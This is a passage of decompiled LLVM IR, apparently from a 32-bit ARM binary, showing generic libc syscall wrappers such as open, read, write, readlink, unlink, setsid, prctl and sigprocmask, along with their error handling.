  %r4.global-to-local = alloca i32, align 4
  %v6_11c1c = load i32, i32* @r2, align 4
  %v1_11c2c = and i32 %arg2, 64
  store i32 %v1_11c2c, i32* @r3, align 4
  %v2_11c2c = icmp eq i32 %v1_11c2c, 0
  br i1 %v2_11c2c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_11c1c
  store i32 %v6_11c1c, i32* @r3, align 4
  %phitmp = urem i32 %v6_11c1c, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11c1c, %bb
  %v0_11c3c = phi i32 [ 0, %dec_label_pc_11c1c ], [ %phitmp, %bb ]
  store i32 %v0_11c3c, i32* @r2, align 4
  %v4_11c44 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_11c48 = icmp eq i32 %v4_11c44, -4096
  store i1 %v7_11c48, i1* @cpsr_z, align 1
  store i32 %v4_11c44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_11c44, -4095
  br i1 %tmp, label %dec_label_pc_11c64, label %dec_label_pc_11c54

dec_label_pc_11c54:                               ; preds = %.thread1
  %v0_11c54 = call i32 @function_120c4()
  %v0_11c58 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c58 = sub i32 0, %v0_11c58
  store i32 %v1_11c58, i32* @r3, align 4
  %v2_11c5c = inttoptr i32 %v0_11c54 to i32*
  store i32 %v1_11c58, i32* %v2_11c5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11c64

dec_label_pc_11c64:                               ; preds = %.thread1, %dec_label_pc_11c54
  %v0_11c64 = phi i32 [ %v4_11c44, %.thread1 ], [ -1, %dec_label_pc_11c54 ]
  ret i32 %v0_11c64

; uselistorder directives
  uselistorder i32 %v4_11c44, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_11c64, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_11c78(i32 %arg1) local_unnamed_addr {
dec_label_pc_11c78:
  store i32 %arg1, i32* @r2, align 4
  %v0_11c80 = load i32, i32* @r0, align 4
  %v2_11c80 = inttoptr i32 %v0_11c80 to i8*
  %v3_11c80 = call i32 @function_11c1c(i8* %v2_11c80, i32 577)
  %v0_11c84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11c84, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_11c78
  %v6_11c84 = and i32 %v3_11c80, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_11c78, %bb
  %v7_11c84 = phi i32 [ %v3_11c80, %dec_label_pc_11c78 ], [ %v6_11c84, %bb ]
  ret i32 %v7_11c84

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_11c88(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11c88:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11c88 = load i32, i32* @r4, align 4
  store i32 %v3_11c88, i32* %stack_var_-8, align 4
  %v2_11c90 = load i32, i32* @r2, align 4
  %v3_11c90 = load i32, i32* @r3, align 4
  %v4_11c90 = call i32 @prctl(i32 %arg1, i32 %arg2, i32 %v2_11c90, i32 %v3_11c90, i32 0)
  store i32 %v4_11c90, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_11c90, -4095
  br i1 %tmp, label %dec_label_pc_11cb0, label %dec_label_pc_11ca0

dec_label_pc_11ca0:                               ; preds = %dec_label_pc_11c88
  %v0_11ca0 = call i32 @function_120c4()
  %v0_11ca4 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ca4 = sub i32 0, %v0_11ca4
  %v2_11ca8 = inttoptr i32 %v0_11ca0 to i32*
  store i32 %v1_11ca4, i32* %v2_11ca8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11cb0

dec_label_pc_11cb0:                               ; preds = %dec_label_pc_11c88, %dec_label_pc_11ca0
  %v0_11cb0 = phi i32 [ %v4_11c90, %dec_label_pc_11c88 ], [ -1, %dec_label_pc_11ca0 ]
  %v2_11cb4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11cb4, i32* @r4, align 4
  ret i32 %v0_11cb0

; uselistorder directives
  uselistorder i32 %v4_11c90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11cb0, { 1, 0 }
}

define i32 @function_11cb8(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11cb8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11cb8 = load i32, i32* @r4, align 4
  store i32 %v3_11cb8, i32* %stack_var_-8, align 4
  %v4_11cbc = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_11cbc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_11cbc, -4095
  br i1 %tmp, label %dec_label_pc_11cdc, label %dec_label_pc_11ccc

dec_label_pc_11ccc:                               ; preds = %dec_label_pc_11cb8
  %v0_11ccc = call i32 @function_120c4()
  %v0_11cd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_11cd0 = sub i32 0, %v0_11cd0
  %v2_11cd4 = inttoptr i32 %v0_11ccc to i32*
  store i32 %v1_11cd0, i32* %v2_11cd4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11cdc

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cb8, %dec_label_pc_11ccc
  %v0_11cdc = phi i32 [ %v4_11cbc, %dec_label_pc_11cb8 ], [ -1, %dec_label_pc_11ccc ]
  %v2_11ce0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11ce0, i32* @r4, align 4
  ret i32 %v0_11cdc

; uselistorder directives
  uselistorder i32 %v4_11cbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11cdc, { 1, 0 }
}

define i32 @function_11ce4(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11ce4:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v3_11ce4 = load i32, i32* @r4, align 4
  store i32 %v3_11ce4, i32* %stack_var_-8, align 4
  %v7_11ce8 = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  store i32 %v7_11ce8, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v7_11ce8, -4095
  br i1 %tmp6, label %dec_label_pc_11d08, label %dec_label_pc_11cf8

dec_label_pc_11cf8:                               ; preds = %dec_label_pc_11ce4
  %v0_11cf8 = call i32 @function_120c4()
  %v0_11cfc = load i32, i32* %r4.global-to-local, align 4
  %v1_11cfc = sub i32 0, %v0_11cfc
  %v2_11d00 = inttoptr i32 %v0_11cf8 to i32*
  store i32 %v1_11cfc, i32* %v2_11d00, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d08

dec_label_pc_11d08:                               ; preds = %dec_label_pc_11ce4, %dec_label_pc_11cf8
  %v0_11d08 = phi i32 [ %v7_11ce8, %dec_label_pc_11ce4 ], [ -1, %dec_label_pc_11cf8 ]
  %v2_11d0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11d0c, i32* @r4, align 4
  ret i32 %v0_11d08

; uselistorder directives
  uselistorder i32 %v7_11ce8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d08, { 1, 0 }
}

define i32 @function_11d10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11d10:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d10 = load i32, i32* @r4, align 4
  store i32 %v3_11d10, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11d38, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11d10
  %v0_11d28 = call i32 @function_120c4()
  %v0_11d2c = load i32, i32* %r4.global-to-local, align 4
  %v1_11d2c = sub i32 0, %v0_11d2c
  %v2_11d30 = inttoptr i32 %v0_11d28 to i32*
  store i32 %v1_11d2c, i32* %v2_11d30, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11d3c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11d38

dec_label_pc_11d38:                               ; preds = %dec_label_pc_11d10, %dec_label_pc_11d28
  %v2_11d3c = phi i32 [ %v3_11d10, %dec_label_pc_11d10 ], [ %v2_11d3c.pre, %dec_label_pc_11d28 ]
  %v0_11d38 = phi i32 [ %arg1, %dec_label_pc_11d10 ], [ -1, %dec_label_pc_11d28 ]
  store i32 %v2_11d3c, i32* @r4, align 4
  ret i32 %v0_11d38

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d38, { 1, 0 }
}

define i32 @function_11d40(i32 %arg1) local_unnamed_addr {
dec_label_pc_11d40:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d40 = load i32, i32* @r4, align 4
  store i32 %v3_11d40, i32* %stack_var_-8, align 4
  %v0_11d44 = call i32 @setsid()
  store i32 %v0_11d44, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d44, -4095
  br i1 %tmp, label %dec_label_pc_11d64, label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d40
  %v0_11d54 = call i32 @function_120c4()
  %v0_11d58 = load i32, i32* %r4.global-to-local, align 4
  %v1_11d58 = sub i32 0, %v0_11d58
  %v2_11d5c = inttoptr i32 %v0_11d54 to i32*
  store i32 %v1_11d58, i32* %v2_11d5c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11d64

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11d40, %dec_label_pc_11d54
  %v0_11d64 = phi i32 [ %v0_11d44, %dec_label_pc_11d40 ], [ -1, %dec_label_pc_11d54 ]
  %v2_11d68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11d68, i32* @r4, align 4
  ret i32 %v0_11d64

; uselistorder directives
  uselistorder i32 %v0_11d44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d64, { 1, 0 }
}

define i32 @function_11d6c(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11d6c:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11d6c = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_11d6c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11d6c
  %v3_11d745 = load i32, i32* @r4, align 4
  store i32 %v3_11d745, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11d94

bb:                                               ; preds = %dec_label_pc_11d6c
  %v3_11d74 = load i32, i32* @r4, align 4
  store i32 %v3_11d74, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_11d94, label %dec_label_pc_11d80

dec_label_pc_11d80:                               ; preds = %bb
  %v0_11d80 = call i32 @function_120c4()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_11d8c = inttoptr i32 %v0_11d80 to i32*
  store i32 22, i32* %v2_11d8c, align 4
  %v0_11db8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11db8

dec_label_pc_11d94:                               ; preds = %.thread, %bb
  %v7_11d94 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_11d94, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_11d94, -4095
  br i1 %tmp13, label %dec_label_pc_11db4, label %dec_label_pc_11da4

dec_label_pc_11da4:                               ; preds = %dec_label_pc_11d94
  %v0_11da4 = call i32 @function_120c4()
  %v0_11da8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11da8 = sub i32 0, %v0_11da8
  %v2_11dac = inttoptr i32 %v0_11da4 to i32*
  store i32 %v1_11da8, i32* %v2_11dac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11db4

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11d94, %dec_label_pc_11da4
  %v0_11db4 = phi i32 [ %v7_11d94, %dec_label_pc_11d94 ], [ -1, %dec_label_pc_11da4 ]
  store i32 %v0_11db4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11db8

dec_label_pc_11db8:                               ; preds = %dec_label_pc_11d80, %dec_label_pc_11db4
  %v0_11db8 = phi i32 [ %v0_11db8.pre, %dec_label_pc_11d80 ], [ %v0_11db4, %dec_label_pc_11db4 ]
  %v2_11dbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11dbc, i32* @r4, align 4
  ret i32 %v0_11db8

; uselistorder directives
  uselistorder i32 %v7_11d94, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_11db8, { 1, 0 }
  uselistorder label %dec_label_pc_11db4, { 1, 0 }
  uselistorder label %dec_label_pc_11d94, { 1, 0 }
}

define i32 @function_11dc0(i32* %arg1) local_unnamed_addr {
dec_label_pc_11dc0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11dc0 = load i32, i32* @r4, align 4
  store i32 %v3_11dc0, i32* %stack_var_-8, align 4
  %v2_11dc4 = call i32 @time(i32* %arg1)
  store i32 %v2_11dc4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11dc4, -4095
  br i1 %tmp, label %dec_label_pc_11de4, label %dec_label_pc_11dd4

dec_label_pc_11dd4:                               ; preds = %dec_label_pc_11dc0
  %v0_11dd4 = call i32 @function_120c4()
  %v0_11dd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11dd8 = sub i32 0, %v0_11dd8
  %v2_11ddc = inttoptr i32 %v0_11dd4 to i32*
  store i32 %v1_11dd8, i32* %v2_11ddc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11de4

dec_label_pc_11de4:                               ; preds = %dec_label_pc_11dc0, %dec_label_pc_11dd4
  %v0_11de4 = phi i32 [ %v2_11dc4, %dec_label_pc_11dc0 ], [ -1, %dec_label_pc_11dd4 ]
  %v2_11de8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11de8, i32* @r4, align 4
  ret i32 %v0_11de4

; uselistorder directives
  uselistorder i32 %v2_11dc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11de4, { 1, 0 }
}

define i32 @function_11dec(i8* %arg1) local_unnamed_addr {
dec_label_pc_11dec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11dec = load i32, i32* @r4, align 4
  store i32 %v3_11dec, i32* %stack_var_-8, align 4
  %v3_11df0 = call i32 @unlink(i8* %arg1)
  store i32 %v3_11df0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_11df0, -4095
  br i1 %tmp, label %dec_label_pc_11e10, label %dec_label_pc_11e00

dec_label_pc_11e00:                               ; preds = %dec_label_pc_11dec
  %v0_11e00 = call i32 @function_120c4()
  %v0_11e04 = load i32, i32* %r4.global-to-local, align 4
  %v1_11e04 = sub i32 0, %v0_11e04
  %v2_11e08 = inttoptr i32 %v0_11e00 to i32*
  store i32 %v1_11e04, i32* %v2_11e08, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11e10

dec_label_pc_11e10:                               ; preds = %dec_label_pc_11dec, %dec_label_pc_11e00
  %v0_11e10 = phi i32 [ %v3_11df0, %dec_label_pc_11dec ], [ -1, %dec_label_pc_11e00 ]
  %v2_11e14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11e14, i32* @r4, align 4
  ret i32 %v0_11e10

; uselistorder directives
  uselistorder i32 %v3_11df0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e10, { 1, 0 }
}

define i32 @function_11e18(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11e18:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11e18 = load i32, i32* @r4, align 4
  store i32 %v3_11e18, i32* %stack_var_-8, align 4
  %v4_11e1c = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_11e1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_11e1c, -4095
  br i1 %tmp, label %dec_label_pc_11e3c, label %dec_label_pc_11e2c

dec_label_pc_11e2c:                               ; preds = %dec_label_pc_11e18
  %v0_11e2c = call i32 @function_120c4()
  %v0_11e30 = load i32, i32* %r4.global-to-local, align 4
  %v1_11e30 = sub i32 0, %v0_11e30
  %v2_11e34 = inttoptr i32 %v0_11e2c to i32*
  store i32 %v1_11e30, i32* %v2_11e34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11e3c

dec_label_pc_11e3c:                               ; preds = %dec_label_pc_11e18, %dec_label_pc_11e2c
  %v0_11e3c = phi i32 [ %v4_11e1c, %dec_label_pc_11e18 ], [ -1, %dec_label_pc_11e2c ]
  %v2_11e40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11e40, i32* @r4, align 4
  ret i32 %v0_11e3c

; uselistorder directives
  uselistorder i32 %v4_11e1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11e3c, { 1, 0 }
}

define i32 @function_11e44(i32* %arg1) local_unnamed_addr {
dec_label_pc_11e44:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11e44 = load i32, i32* @r4, align 4
  store i32 %v3_11e44, i32* %stack_var_-20, align 4
  %v6_11e44 = load i32, i32* @r5, align 4
  %v9_11e44 = load i32, i32* @r6, align 4
  %v12_11e44 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_11e4c = load i32, i32* %arg1, align 4
  store i32 %v2_11e4c, i32* %r4.global-to-local, align 4
  %v2_11e50 = ptrtoint i32* %stack_var_-36 to i32
  %v1_11e54 = add i32 %tmp, 24
  store i32 %v1_11e54, i32* @r6, align 4
  %v3_11e58 = icmp eq i32 %v2_11e4c, -1
  store i32 %v2_11e50, i32* @r7, align 4
  store i32 %v1_11e54, i32* %r2.global-to-local, align 4
  store i32 %v2_11e50, i32* @r0, align 4
  br i1 %v3_11e58, label %dec_label_pc_11e70, label %dec_label_pc_11e84

dec_label_pc_11e70:                               ; preds = %dec_label_pc_11e44
  %v0_11e70 = call i32 @function_120c4()
  %v0_11e78 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11e78, i32* %r2.global-to-local, align 4
  %v2_11e7c = inttoptr i32 %v0_11e70 to i32*
  store i32 9, i32* %v2_11e7c, align 4
  %v0_11edc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11edc

dec_label_pc_11e84:                               ; preds = %dec_label_pc_11e44
  %v8_11e8c = call i32 @function_13114(i32 %v2_11e50, i32 ptrtoint (i32* @global_var_1310c.372 to i32), i32 %v1_11e54, i32 78100, i32 %v3_11e44, i32 %v6_11e44, i32 %v9_11e44)
  %v1_11e9c = call i32 @function_1310c()
  %v0_11ea8 = load i32, i32* @r5, align 4
  %v1_11ea8 = inttoptr i32 %v0_11ea8 to i32*
  %v2_11ea8 = load i32, i32* %v1_11ea8, align 4
  store i32 %v2_11ea8, i32* @r4, align 4
  store i32 %v2_11e50, i32* @r0, align 4
  store i32 -1, i32* %v1_11ea8, align 4
  store i32 ptrtoint (i32* @global_var_11ec0.376 to i32), i32* @lr, align 4
  %v8_11ebc = call i32 @function_13114(i32 %v2_11e50, i32 1, i32 %v1_11e54, i32 78100, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_11ec0 = load i32, i32* @r5, align 4
  %v1_11ec0 = add i32 %v0_11ec0, 12
  %v2_11ec0 = inttoptr i32 %v1_11ec0 to i32*
  %v3_11ec0 = load i32, i32* %v2_11ec0, align 4
  store i32 %v3_11ec0, i32* @r0, align 4
  %v0_11ec4 = call i32 @function_12724()
  %v0_11ec8 = load i32, i32* @r5, align 4
  store i32 %v0_11ec8, i32* @r0, align 4
  %v0_11ecc = call i32 @function_12724()
  %v0_11ed0 = load i32, i32* @r4, align 4
  %v1_11ed4 = call i32 @function_11af0(i32 %v0_11ed0)
  store i32 %v1_11ed4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11edc

dec_label_pc_11edc:                               ; preds = %dec_label_pc_11e70, %dec_label_pc_11e84
  %v0_11edc = phi i32 [ %v0_11edc.pre, %dec_label_pc_11e70 ], [ %v1_11ed4, %dec_label_pc_11e84 ]
  %v2_11ee4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11ee4, i32* @r4, align 4
  store i32 %v6_11e44, i32* @r5, align 4
  store i32 %v9_11e44, i32* @r6, align 4
  store i32 %v12_11e44, i32* @r7, align 4
  ret i32 %v0_11edc

; uselistorder directives
  uselistorder i32 %v1_11e54, { 2, 1, 0, 3 }
  uselistorder i32 %v2_11e50, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_11e44, { 1, 0 }
  uselistorder i32 %v6_11e44, { 1, 0 }
  uselistorder label %dec_label_pc_11edc, { 1, 0 }
}

define i32 @function_11ef8(i32 %arg1) local_unnamed_addr {
dec_label_pc_11ef8:
  %r5.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-108 = alloca i32, align 4
  %v3_11ef8 = load i32, i32* @r4, align 4
  %v9_11ef8 = load i32, i32* @r6, align 4
  %v12_11ef8 = load i32, i32* @r7, align 4
  %v0_11f04 = load i32, i32* @r0, align 4
  %v2_11f04 = inttoptr i32 %v0_11f04 to i8*
  %v3_11f04 = call i32 @function_11c1c(i8* %v2_11f04, i32 18432)
  store i32 %v3_11f04, i32* @r0, align 4
  store i32 %v3_11f04, i32* @r7, align 4
  %v1_11f08 = icmp slt i32 %v3_11f04, 0
  br i1 %v1_11f08, label %.thread1, label %dec_label_pc_11f14

.thread1:                                         ; preds = %dec_label_pc_11ef8
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_11fe4

dec_label_pc_11f14:                               ; preds = %dec_label_pc_11ef8
  %v2_11f00 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_11f00, i32* @r1, align 4
  %v0_11f18 = call i32 @function_13538()
  %v1_11f1c = icmp slt i32 %v0_11f18, 0
  br i1 %v1_11f1c, label %dec_label_pc_11f3c, label %dec_label_pc_11f24

dec_label_pc_11f24:                               ; preds = %dec_label_pc_11f14
  %v0_11f24 = load i32, i32* @r7, align 4
  store i32 1, i32* @r2, align 4
  %v2_11f30 = call i32 @function_11a2c(i32 %v0_11f24, i32 2)
  %v1_11f34 = icmp slt i32 %v2_11f30, 0
  br i1 %v1_11f34, label %dec_label_pc_11f3c, label %dec_label_pc_11f5c

dec_label_pc_11f3c:                               ; preds = %dec_label_pc_11f24, %dec_label_pc_11f14
  %v0_11f3c = call i32 @function_120c4()
  store i32 %v0_11f3c, i32* %r5.global-to-local, align 4
  %v0_11f44 = load i32, i32* @r7, align 4
  %v1_11f48 = inttoptr i32 %v0_11f3c to i32*
  %v2_11f48 = load i32, i32* %v1_11f48, align 4
  store i32 %v2_11f48, i32* @r4, align 4
  %v1_11f4c = call i32 @function_11af0(i32 %v0_11f44)
  store i32 0, i32* @r6, align 4
  %v0_11f54 = load i32, i32* @r4, align 4
  %v1_11f54 = load i32, i32* %r5.global-to-local, align 4
  %v2_11f54 = inttoptr i32 %v1_11f54 to i32*
  store i32 %v0_11f54, i32* %v2_11f54, align 4
  br label %dec_label_pc_11fe4

dec_label_pc_11f5c:                               ; preds = %dec_label_pc_11f24
  %v1_11f60 = call i32 @function_12578(i32 48)
  store i32 %v1_11f60, i32* @r6, align 4
  %v2_11f64 = icmp eq i32 %v1_11f60, 0
  br i1 %v2_11f64, label %dec_label_pc_11fb4, label %dec_label_pc_11f6c

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f5c
  store i32 0, i32* @r4, align 4
  %v2_11f70 = add i32 %v1_11f60, 16
  %v3_11f70 = inttoptr i32 %v2_11f70 to i32*
  store i32 0, i32* %v3_11f70, align 4
  %v2_11f78 = icmp ugt i32 %tmp, 511
  %v1_11f7c = load i32, i32* @r6, align 4
  %v2_11f7c = add i32 %v1_11f7c, 20
  %v3_11f7c = inttoptr i32 %v2_11f7c to i32*
  store i32 %tmp, i32* %v3_11f7c, align 4
  br i1 %v2_11f78, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_11f6c
  %v2_11f84 = load i32, i32* @r6, align 4
  %v3_11f84 = add i32 %v2_11f84, 20
  %v4_11f84 = inttoptr i32 %v3_11f84 to i32*
  store i32 512, i32* %v4_11f84, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11f6c, %bb
  %v0_11f88 = load i32, i32* @r7, align 4
  %v1_11f88 = load i32, i32* @r6, align 4
  %v2_11f88 = inttoptr i32 %v1_11f88 to i32*
  store i32 %v0_11f88, i32* %v2_11f88, align 4
  %v0_11f8c = load i32, i32* @r4, align 4
  %v1_11f8c = load i32, i32* @r6, align 4
  %v2_11f8c = add i32 %v1_11f8c, 8
  %v3_11f8c = inttoptr i32 %v2_11f8c to i32*
  store i32 %v0_11f8c, i32* %v3_11f8c, align 4
  %v0_11f90 = load i32, i32* @r4, align 4
  %v1_11f90 = load i32, i32* @r6, align 4
  %v2_11f90 = add i32 %v1_11f90, 4
  %v3_11f90 = inttoptr i32 %v2_11f90 to i32*
  store i32 %v0_11f90, i32* %v3_11f90, align 4
  %v0_11f98 = load i32, i32* @r6, align 4
  %v1_11f98 = add i32 %v0_11f98, 20
  %v2_11f98 = inttoptr i32 %v1_11f98 to i32*
  %v3_11f98 = load i32, i32* %v2_11f98, align 4
  %v2_11f9c = call i32 @function_126cc(i32 1, i32 %v3_11f98)
  %v2_11fa0 = icmp eq i32 %v2_11f9c, 0
  %v1_11fa4 = load i32, i32* @r6, align 4
  %v2_11fa4 = add i32 %v1_11fa4, 12
  %v3_11fa4 = inttoptr i32 %v2_11fa4 to i32*
  store i32 %v2_11f9c, i32* %v3_11fa4, align 4
  br i1 %v2_11fa0, label %dec_label_pc_11fac, label %dec_label_pc_11fd0

dec_label_pc_11fac:                               ; preds = %.thread
  %v0_11fac = load i32, i32* @r6, align 4
  store i32 %v0_11fac, i32* @r0, align 4
  %v0_11fb0 = call i32 @function_12724()
  br label %dec_label_pc_11fb4

dec_label_pc_11fb4:                               ; preds = %dec_label_pc_11f5c, %dec_label_pc_11fac
  %v0_11fb4 = load i32, i32* @r7, align 4
  %v1_11fb8 = call i32 @function_11af0(i32 %v0_11fb4)
  %v0_11fbc = call i32 @function_120c4()
  store i32 0, i32* @r6, align 4
  %v2_11fc8 = inttoptr i32 %v0_11fbc to i32*
  store i32 12, i32* %v2_11fc8, align 4
  br label %dec_label_pc_11fe4

dec_label_pc_11fd0:                               ; preds = %.thread
  store i32 73700, i32* @lr, align 4
  %v1_11fe0 = call i32 @function_1310c()
  br label %dec_label_pc_11fe4

dec_label_pc_11fe4:                               ; preds = %.thread1, %dec_label_pc_11fb4, %dec_label_pc_11f3c, %dec_label_pc_11fd0
  %v0_11fe4 = load i32, i32* @r6, align 4
  store i32 %v3_11ef8, i32* @r4, align 4
  store i32 %v9_11ef8, i32* @r6, align 4
  store i32 %v12_11ef8, i32* @r7, align 4
  ret i32 %v0_11fe4

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_126cc, { 39, 41, 40, 38, 37, 36, 22, 35, 34, 33, 32, 28, 27, 26, 25, 24, 23, 21, 20, 19, 18, 17, 16, 15, 14, 2, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 31, 30, 29 }
  uselistorder i32 512, { 0, 5, 1, 6, 8, 2, 9, 3, 10, 4, 11, 7 }
  uselistorder i32 (i32)* @function_11af0, { 20, 19, 18, 33, 37, 36, 32, 31, 35, 34, 30, 29, 23, 28, 27, 26, 25, 24, 22, 4, 3, 2, 21, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1 }
  uselistorder label %dec_label_pc_11fe4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_11fb4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_11ff4(i32* %arg1) local_unnamed_addr {
dec_label_pc_11ff4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_11ff4 = load i32, i32* @r4, align 4
